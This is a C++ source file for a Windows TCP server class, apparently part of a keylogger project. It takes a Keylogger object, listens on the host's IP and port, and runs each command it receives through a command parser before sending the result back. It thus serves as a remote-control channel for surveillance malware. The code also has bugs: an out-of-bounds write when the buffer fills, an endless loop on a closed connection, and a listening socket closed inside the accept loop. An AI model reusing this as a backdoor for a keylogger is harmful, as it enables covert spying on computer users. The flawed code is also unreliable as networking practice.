#include "stdafx.h"
#include "SocketServer.h"

SocketServer::SocketServer(Keylogger* logger) {
	listenSocket = INVALID_SOCKET;

	std::wcout << L"socket";
	WSADATA wsaData;
	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0) {
		cerr << "WSAStartup failed: " << result << "\n";
	}

	struct addrinfo* addr = nullptr;
	struct addrinfo hints;
	ZeroMemory(&hints, sizeof(hints));

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM; 
	hints.ai_protocol = IPPROTO_TCP; 

	hints.ai_flags = AI_PASSIVE;

	std::wcout << ComputerInfoHelper::getInstance()->getHostName() << L" " <<
		ComputerInfoHelper::getInstance()->getIp() << std::endl;

	result = getaddrinfo(StringUtilities::ws2s(ComputerInfoHelper::getInstance()->getIp()).c_str(),
		StringUtilities::ws2s(ComputerInfoHelper::getInstance()->getPort()).c_str(), &hints, &addr);

	if (result != 0) {
		cerr << "getaddrinfo failed: " << result << "\n";
		WSACleanup();
	}

	this->listenSocket = socket(addr->ai_family, addr->ai_socktype,
		addr->ai_protocol);

	if (this->listenSocket == INVALID_SOCKET) {
		cerr << "Error at socket: " << WSAGetLastError() << "\n";
		freeaddrinfo(addr);
		WSACleanup();
	}

	int bindResult = ::bind(this->listenSocket, addr->ai_addr, (int)addr->ai_addrlen);

	if (listen(this->listenSocket, SOMAXCONN) == SOCKET_ERROR) {
		cerr << "listen failed with error: " << WSAGetLastError() << "\n";
		closesocket(this->listenSocket);
		this->listenSocket = INVALID_SOCKET;
		WSACleanup();
	}
}

void SocketServer::start() {
	if (this->listenSocket == INVALID_SOCKET) {
		cerr << "socket is not active" << std::endl;
		return;
	} else {
		std::wcout << "socket active" << std::endl;
	}

	wchar_t requestBuffer[SOCKET_BUFFER_SIZE];
	int clientSocket = INVALID_SOCKET;

	while (true) {
		clientSocket = accept(this->listenSocket, NULL, NULL);
		std::wcout << L"accepted client: " << clientSocket << std::endl;

		if (clientSocket == INVALID_SOCKET) {
			cerr << "accept failed: " << WSAGetLastError() << std::endl;
			closesocket(this->listenSocket);
			WSACleanup();
			continue;
		}

		while (true) {
			int receivedSize = recv(clientSocket, (char*)requestBuffer, sizeof(wchar_t) * SOCKET_BUFFER_SIZE, 0);
			
			
			std::wstring response;

			if (receivedSize == SOCKET_ERROR) {
				cerr << "recv failed: " << receivedSize << std::endl;
				break;
			} else if (receivedSize == 0) {
				cerr << "connection closed..." << std::endl;
			} else if (receivedSize > 0) {
				requestBuffer[receivedSize / 2] = '\0';
				std::wstring request = std::wstring(requestBuffer);
				std::wcout << L"received: " << request << std::endl;

				response = this->getResponse(request);

				int sendResult = send(clientSocket, (char*)response.c_str(),
					sizeof(wchar_t) * response.size(), 0);

				if (request.compare(L"exit") == 0) {
					break;
				}

				if (sendResult == SOCKET_ERROR) {
					cerr << "send failed: " << WSAGetLastError() << std::endl;
				}
			}
		}

		closesocket(clientSocket);
	}

}

std::wstring SocketServer::getResponse(std::wstring request) {
	return CommandParser::act(request);
}